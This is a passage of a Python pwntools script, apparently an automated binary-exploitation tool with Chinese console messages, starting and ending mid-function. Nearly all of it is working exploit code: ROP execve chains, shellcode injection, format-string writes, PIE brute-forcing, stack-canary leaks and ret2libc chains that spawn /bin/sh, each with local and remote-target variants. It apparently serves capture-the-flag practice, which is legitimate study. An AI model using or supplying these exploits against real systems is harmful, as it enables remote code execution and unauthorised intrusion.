		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)
		payload = flat([asm('nop') * padding, pop_eax_addr, 0xb, pop_ecx_ebx_addr, 0 , bin_sh_addr , pop_edx_addr , 0 , int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()
	else:
		io = remote(url,port)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_addr = int(pop_ecx_addr, 16)
		pop_ecx_addr = p32(pop_ecx_addr)
		pop_ebx_addr = int(pop_ebx_addr, 16)
		pop_ebx_addr = p32(pop_ebx_addr)
		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)
		payload = flat([asm('nop') * padding, pop_eax_addr, 0xb, pop_ebx_addr, bin_sh_addr , pop_ecx_addr, 0 , pop_edx_addr , 0 , int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()

def execve_syscall(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80):
	if pop_ecx_addr == None:
		io = process(program)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_ebx_addr = int(pop_ecx_ebx_addr, 16)
		pop_ecx_ebx_addr = p32(pop_ecx_ebx_addr)
		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)
		payload = flat([asm('nop') * padding, pop_eax_addr, 0xb, pop_ecx_ebx_addr, 0 , bin_sh_addr , pop_edx_addr , 0 , int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()
	else:
		io = process(program)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_addr = int(pop_ecx_addr, 16)
		pop_ecx_addr = p32(pop_ecx_addr)
		pop_ebx_addr = int(pop_ebx_addr, 16)
		pop_ebx_addr = p32(pop_ebx_addr)
		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)
		payload = flat([asm('nop') * padding, pop_eax_addr, 0xb, pop_ebx_addr, bin_sh_addr , pop_ecx_addr, 0 , pop_edx_addr , 0 , int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()

def rwx_shellcode_x32(program, buf_addr, padding ,function_name,ret_addr):
	io = process(program)
	elf = ELF(program)
	buf_addr = int(buf_addr, 16)
	buf_addr = p32(buf_addr)
	name_addr = elf.symbols[function_name]
	shellcode = asm(shellcraft.sh())
	payload = flat([shellcode.ljust(padding,asm('nop')) ,  p32(name_addr) ])
	io.recv()
	io.sendline(payload)
	io.interactive()

def rwx_shellcode_x32_remote(program, buf_addr, padding ,function_name,ret_addr,url,port):
	io = remote(url,port)
	elf = ELF(program)
	buf_addr = int(buf_addr, 16)
	buf_addr = p32(buf_addr)
	name_addr = elf.symbols[function_name]
	shellcode = asm(shellcraft.sh())
	payload = flat([shellcode.ljust(padding,asm('nop')) ,  p32(name_addr) ])
	io.recv()
	io.sendline(payload)
	io.interactive()

def rwx_shellcode_x64(program, buf_addr, padding, function_name,ret_addr):
	io = process(program)
	elf = ELF(program)
	buf_addr = int(buf_addr, 16)
	buf_addr = p64(buf_addr)
	name_addr = elf.symbols[function_name]
	shellcode = asm(shellcraft.sh())
	payload = flat([shellcode.ljust(padding,asm('nop')) ,  p64(name_addr) ])
	io.recv()
	io.sendline(payload)
	io.interactive()

def rwx_shellcode_x64_remote(program, buf_addr, padding, function_name,ret_addr,url,port):
	io = remote(url,port)
	elf = ELF(program)
	buf_addr = int(buf_addr, 16)
	buf_addr = p64(buf_addr)
	name_addr = elf.symbols[function_name]
	shellcode = asm(shellcraft.sh())
	payload = flat([shellcode.ljust(padding,asm('nop')) ,  p64(name_addr) ])
	io.recv()
	io.sendline(payload)
	io.interactive()


def detect_format_string_vulnerability(program):
	fmtstr = None

	TARGET_PROGRAM = program

	TEST_CASES = [
	    b"%x" * 20,
	    b"%p" * 20,
	    b"%s" * 20,
	    b"%n" * 5,
	    b"AAAA%x%x%x%x",
	    b"%99999999s",
	]


	MEMORY_PATTERN = re.compile(r'(0x[0-9a-fA-F]+)')
	vulnerable = False
	for case in TEST_CASES:
		try:
			proc = subprocess.Popen(
				[TARGET_PROGRAM],
				stdin=subprocess.PIPE,
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
			)
			stdout, stderr = proc.communicate(input=case, timeout=2)
            
			if MEMORY_PATTERN.search(stdout.decode()):
				print(f"[!]疑似漏洞: 测试用例 '\033[31m{case}\033[0m' 输出了内存地址")
				print(f"    输出内容: {stdout[:100]}...")
				vulnerable = True
            
			if proc.returncode != 0:
				print(f"[!]程序崩溃: 测试用例 '\033[31m{case}\033[0m' 导致返回码 \033[31m{proc.returncode}\033[0m")
				vulnerable = True
                
		except subprocess.TimeoutExpired:
			print(f"[!]测试用例 '\033[31m{case}\033[0m' 导致超时，可能存在拒绝服务漏洞")
			vulnerable = True
		except Exception as e:
			print(f"[错误] 执行测试用例时发生异常: \033[31m{e}\033[0m")
    
	if vulnerable:
		print("[*]检测到程序存在的格式化字符串漏洞！")
		fmtstr = 1
	else:
		print("\n[-]未发现明显的格式化字符串漏洞。")
		sys.exit(0)

	return fmtstr

def find_ftmstr_bss_symbols(program):
	function = 0
	with open(program, 'rb') as f:
		elf = ELFFile(f)
	
		symtab = elf.get_section_by_name('.symtab')
		if not symtab:
			print("[*]没有找到if判断的变量")
			return function
		for symbol in symtab.iter_symbols():
			if (symbol['st_info'].type == 'STT_OBJECT' and
				symbol['st_size'] > 2 and
				'_' not in symbol.name):
				print(f"[*]找到if判断的变量: \033[31m{symbol.name}\033[0m, 地址为: \033[31m{hex(symbol['st_value'])}\033[0m")
				function = 1
				buf_addr = hex(symbol['st_value'])
				function_name = symbol.name

		return function, buf_addr , function_name

def find_offset(program):
	p = process(program)
	payload = b'AAAA' + b'.%x' * 40
	p.sendline(payload)
	try:
		output = p.recv(timeout=2)
	except:
		output = p.clean()
	parts = output.split(b'.')
	for i in range(1, len(parts)):
		part = parts[i].split(b'\n')[0].split()[0] if b' ' in parts[i] else parts[i]
		try:
			val = int(part, 16)
			if val == 0x41414141:
				p.close()
				return i
		except:
			continue
	p.close()
	raise ValueError('[-]Offset not found')

def system_fmtstr(program,offset,buf_addr):
	io = process(program)
	elf = ELF(program)
	buf_addr = int(buf_addr, 16)
	buf_addr = p32(buf_addr)
	system_addr = buf_addr
	offset_bytes = str(offset).encode()

	payload = system_addr + b'%' + offset_bytes + b'$n'

	io.sendline(payload)
	io.interactive()

def system_fmtstr_remote(program,offset,buf_addr,url,port):
	io = remote(url,port)
	elf = ELF(program)
	buf_addr = int(buf_addr, 16)
	buf_addr = p64(buf_addr)
	system_addr = buf_addr
	offset_bytes = str(offset).encode()

	payload = system_addr + b'%' + offset_bytes + b'$n'

	io.sendline(payload)
	io.interactive()

def pie_backdoor_exploit(program,padding,backdoor,libc_path,libc,callsystem):	
	elf = ELF(program)
	if backdoor == 1:
		backdoor = elf.symbols["backdoor"] + 0x04
	if callsystem == 1:
		backdoor = elf.symbols["callsystem"] + 0x04
	backdoor_bytes = p64(backdoor)
	valid_bytes = backdoor_bytes.replace(b'\x00', b'')
	valid_byte_length = len(valid_bytes)

	cleaned_bytes = backdoor_bytes[:valid_byte_length]
	payload = asm("nop") * padding + cleaned_bytes

	count = 1
	while True:
		io = process(program)
		try:
			count += 1
			print(count,end=' ')
			io.recv()
			io.send(payload)
			recv = io.recv(timeout=10)
		except:
			print("error",end=' ')
		else:
			io.interactive()
			break

def pie_backdoor_exploit_remote(program,padding,backdoor,libc_path,libc,url,port,callsystem):	
	elf = ELF(program)
	if backdoor == 1:
		backdoor = elf.symbols["backdoor"] + 0x04
	if callsystem == 1:
		backdoor = elf.symbols["callsystem"] + 0x04
	backdoor_bytes = p64(backdoor)
	valid_bytes = backdoor_bytes.replace(b'\x00', b'')
	valid_byte_length = len(valid_bytes)

	cleaned_bytes = backdoor_bytes[:valid_byte_length]
	payload = asm("nop") * padding + cleaned_bytes

	count = 1
	while True:
		io = remote(url,port)
		try:
			count += 1
			print(count,end=' ')
			io.recv()
			io.send(payload)
			recv = io.recv(timeout=10)
		except:
			print("error",end=' ')
		else:
			io.interactive()
			break

def fmtstr_print_strings(program):
	elf = context.binary = ELF(program, checksec=False)

	for i in range(100):
		try:
			io = process(level='error')
			io.sendline('%{}$s'.format(i).encode())
			result = io.recv()
			print(str(i) + ': ' + str(result))
			io.close()
		except EOFError:
			pass

def fmtstr_print_strings_remote(program,url,port):
	elf = context.binary = ELF(program, checksec=False)

	for i in range(100):
		try:
			io = remote(url,port)
			io.sendline('%{}$s'.format(i).encode())
			result = io.recv()
			print(str(i) + ': ' + str(result))
			io.close()
		except EOFError:
			pass

def leakage_canary_value(program):
	elf = context.binary = ELF(program, checksec=False)
	with open('canary.txt', 'w') as f:
		for i in range(100):
			try:
				with process(level='error') as p:
					p.sendline(f'%{i}$p'.encode())
					p.recvline()
					result = p.recvline().decode().strip()
					if result:
						line = f"{result}\n"
						f.write(line)
			except EOFError:
				pass

def canary_fuzz(program,bit):
	if bit == 64:
		char = 'A'
		test = 'AAAAAAAA'
		with open('canary.txt', 'r') as f:
			lines = [line.strip() for line in f.readlines()[1:]]

		c = 1
		i = 1
		max_c = 300
		max_i = len(lines)

		while c < max_c and i < max_i:
			current_line = lines[i]
			found_j = False
			exit_current = False
			for j in range(i + 1, max_i):
				if lines[j].startswith('0x8'):
					diff = j - i
					padding = 0
					found_j = True
	                
					while padding <= 300:
						io = process(program)
						io.recv()
						io.sendline(f'%{c}$p'.encode())
						result = io.recvline().decode().strip()
						print(f"[Debug] c={c}, i={i}, padding={padding}, result={result}, diff={diff}")

						if result.startswith('0x'):
							result = int(result, 16)
							result = p64(result)
	                    
						input_data = flat([char * (padding + 1) , result , test * diff])
						io.recv()
						io.sendline(input_data)
						io.wait()
	                    
						if io.poll() == -11:
							padding = padding + 1
							print(f"\033[32m[+] 漏洞发现！c={c}, padding={padding},diff={diff}\033[0m")
							return padding, c, diff
	                    
						io.close()
						padding += 1

					if padding > 300:
						print(f"\033[33m[-] c={c} 测试失败，尝试下一个参数\033[0m")
						c += 1
						i += 1
						exit_current = True
						break

					break

				if exit_current:
					break

			if exit_current:
				continue

			if not found_j:
				i += 1
				if i >= max_i:
					c += 1
					i = 0

		print("\033[31m[!] 所有参数测试完成，未找到有效偏移\033[0m")
		padding = None
		c = None
		diff = None
		return padding, c, diff


	if bit == 32:
		char = 'A'
		test = 'AAAA'
		with open('canary.txt', 'r') as f:
			lines = [line.strip() for line in f.readlines()[1:]]

		c = 1
		i = 1
		max_c = 300
		max_i = len(lines)

		while c < max_c and i < max_i:
			current_line = lines[i]
			found_j = False
			exit_current = False
			for j in range(i + 1, max_i):
				if lines[j].startswith('0x8'):
					diff = j - i
					padding = 0
					found_j = True
	                
					while padding <= 300:
						io = process(program)
						io.recv()
						io.sendline(f'%{c}$p'.encode())
						result = io.recvline().decode().strip()
						print(f"[Debug] c={c}, i={i}, padding={padding}, result={result}, diff={diff}")

						if result.startswith('0x'):
							result = int(result, 16)
							result = p32(result)
	                    
						input_data = flat([char * (padding + 1) , result , test * diff])
						io.recv()
						io.sendline(input_data)
						io.wait()
	                    
						if io.poll() == -11:
							padding = padding + 1
							print(f"\033[32m[+] 漏洞发现！c={c}, padding={padding},diff={diff}\033[0m")
							
							return padding, c, diff
	                    
						io.close()
						padding += 1

					if padding > 300:
						print(f"\033[33m[-] c={c} 测试失败，尝试下一个参数\033[0m")
						c += 1
						i += 1
						exit_current = True
						break

					break

				if exit_current:
					break

			if exit_current:
				continue

			if not found_j:
				i += 1
				if i >= max_i:
					c += 1
					i = 0

		print("\033[31m[!] 所有参数测试完成，未找到有效偏移\033[0m")
		padding = None
		c = None
		diff = None
		return padding, c, diff
	

def ret2libc_put_canary_x32(program,libc,libc_path,padding,c,diff):
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary值为: {result}")
	result = int(result, 16)
	canary = p32(result)

	payload1 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(puts_plt) , p32(main_addr) , p32(puts_got)])
	io.recv()
	io.sendline(payload1)

	puts_addr=u32(io.recvuntil(b'\xf7')[-4:])
	print(f'[*]put函数在libc中的地址为: \033[31m{hex(puts_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:

		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))

		system_addr = puts_addr - libc_puts + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = puts_addr - libc_puts + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	#result = io.recvline().decode().strip()
	#print(f"canary值为: {result}")
	#result = int(result, 16)
	#canary = p32(result)
	io.recv()
	payload2 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(system_addr) , p32(0) , p32(sh_addr)])

	io.sendline(payload2)
	io.interactive()

def ret2libc_put_x32_canary_remote(program,libc,padding,url,port,c,diff):
	io = remote(url,port)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary值为: {result}")
	result = int(result, 16)
	canary = p32(result)

	payload1 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(puts_plt) , p32(main_addr) , p32(puts_got)])
	io.recv()
	io.sendline(payload1)

	puts_addr=u32(io.recvuntil(b'\xf7')[-4:])
	print(f'[*]put函数在libc中的地址为: \033[31m{hex(puts_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:

		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))

		system_addr = puts_addr - libc_puts + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = puts_addr - libc_puts + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	#result = io.recvline().decode().strip()
	#print(f"canary值为: {result}")
	#result = int(result, 16)
	#canary = p32(result)
	io.recv()
	payload2 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(system_addr) , p32(0) , p32(sh_addr)])

	io.sendline(payload2)
	io.interactive()

def ret2libc_put_canary_x64(program,libc,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path,padding,c,diff):
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary值为: {result}")
	result = int(result, 16)
	canary = p64(result)

	payload1 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(puts_got), p64(puts_plt) , p64(main_addr)])
	io.recv()
	io.sendline(payload1)

	puts_addr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
	print(f'[*]put函数在libc中的地址为: \033[31m{hex(puts_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:

		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))

		system_addr = puts_addr - libc_puts + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = puts_addr - libc_puts + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())

	io.recv()
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)
	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(sh_addr), p64(0),ret_addr, p64(system_addr) , p64(0)])
	else:
		payload2 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(sh_addr) ,ret_addr,p64(system_addr)])
	io.sendline(payload2)
	io.interactive()

def ret2libc_put_x64_canary_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,url,port,c,diff):
	io = remote(url,port)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary值为: {result}")
	result = int(result, 16)
	canary = p32(result)

	payload1 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(puts_got), p64(puts_plt) , p64(main_addr)])
	io.recv()
	io.sendline(payload1)

	puts_addr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
	print(f'[*]put函数在libc中的地址为: \033[31m{hex(puts_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:

		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))

		system_addr = puts_addr - libc_puts + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = puts_addr - libc_puts + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())

	io.recv()
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)
	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(sh_addr), p64(0),ret_addr, p64(system_addr) , p64(0)])
	else:
		payload2 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(sh_addr) ,ret_addr,p64(system_addr)])
	io.sendline(payload2)
	io.interactive()

def ret2libc_write_canary_x32(program,libc,padding,libc_path,c,diff):
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary值为: {result}")
	result = int(result, 16)
	canary = p32(result)

	payload1 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(write_plt) , p32(main_addr) , p32(1) , p32(write_got) , p32(4)])
	io.recv()
	io.sendline(payload1)

	write_addr = u32(io.recv(4))
	print(f'[*]write函数在libc中的地址为: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write",write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())

	io.recv()

	payload2 = flat([asm('nop') * padding , canary , b'AAAA' * diff, p32(system_addr) , p32(0) , p32(sh_addr)])
	io.recv()
	io.sendline(payload2)
	io.interactive()

def ret2libc_write_canary_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path,c,diff):
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']
	if other_rsi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary值为: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff ,pop_rdi_addr , p64(1) , pop_rsi_addr , p64(write_got) , p64(0) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary值为: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding , canary , b"AAAAAAAA" * diff , pop_rdi_addr , p64(1) , p64(0), pop_rsi_addr , p64(write_got) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 0 and other_rsi_registers == 0:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary值为: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding , pop_rdi_addr , p64(1) , pop_rsi_addr , p64(write_got) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	write_addr = u64(io.recv(8))
	print(f'[*]write函数在libc中的地址为: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write",write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())

	io.recv()


	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding ,canary , b"AAAAAAAA" * diff , pop_rdi_addr , p64(sh_addr), p64(0), p64(system_addr) , p64(0)])
	else:
		payload2 = flat([asm('nop') * padding , canary , b"AAAAAAAA" * diff, pop_rdi_addr , p64(sh_addr) ,p64(system_addr) , p64(0)])
	io.recv()
	io.sendline(payload2)
	io.interactive()


def ret2libc_write_x32_canary_remote(program,libc,padding,url,port,c,diff):
	io = remote(url,port)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary值为: {result}")
	result = int(result, 16)
	canary = p32(result)

	payload1 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(write_plt) , p32(main_addr) , p32(1) , p32(write_got) , p32(4)])
	io.recv()
	io.sendline(payload1)

	write_addr = u32(io.recv(4))
	print(f'[*]write函数在libc中的地址为: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write",write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
